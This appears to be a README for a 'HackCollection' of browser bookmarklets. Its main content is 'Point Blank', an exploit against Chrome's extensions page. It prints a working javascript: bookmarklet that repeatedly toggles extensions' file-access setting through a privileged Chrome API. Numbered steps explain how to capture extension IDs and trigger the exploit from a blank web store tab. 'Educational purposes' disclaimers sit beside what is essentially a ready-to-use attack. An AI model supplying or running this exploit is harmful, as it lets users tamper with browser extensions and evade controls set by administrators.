Hey, welcome to the HackCollection. Here I enter in my hacks.
ALL MY HACKS ARE BOOKMARKLETS!
I do not condone hacking, this is for educational purposes.
This is all subject to change. Feel free to make issues and I will be sure to add the updated hacks.

If you have any issues please let me know.


HOW TO USE

 Once you have found a hack you like, you are to double click it and drag it to your Bookmark Bar. once you are done, just go to said site and click the bookmark.


CREDIT GOES TO hostedposted, AgrTheDev, milantje200 AND 3kh0
Point Blank is an exploit that allows you to run bookmarklets on privilaged pages, sutch as the chrome extentions page. This exploit was also found by Bypassi, you can read more about how he discovered this exploit You can either use the prompt or the gui the prompt is below 1. Bookmark this code:
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
And the gui is in launcher.js 2. Navigate to chrome://extensions 3. Click on a extension that YOU installed from the Chrome Web Store > Details 4. In the URL bar, copy the string of letters and numbers after the /?id= 5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet 5. Paste the id of the extension into the prompt or input box seperated by commas. If you close the tab, the exploit will stop working.

Please use this only when you have permisson, I (cj-hacks) do not condone the use of this exploit for illegal purposes!
(speech made by 3kh0)
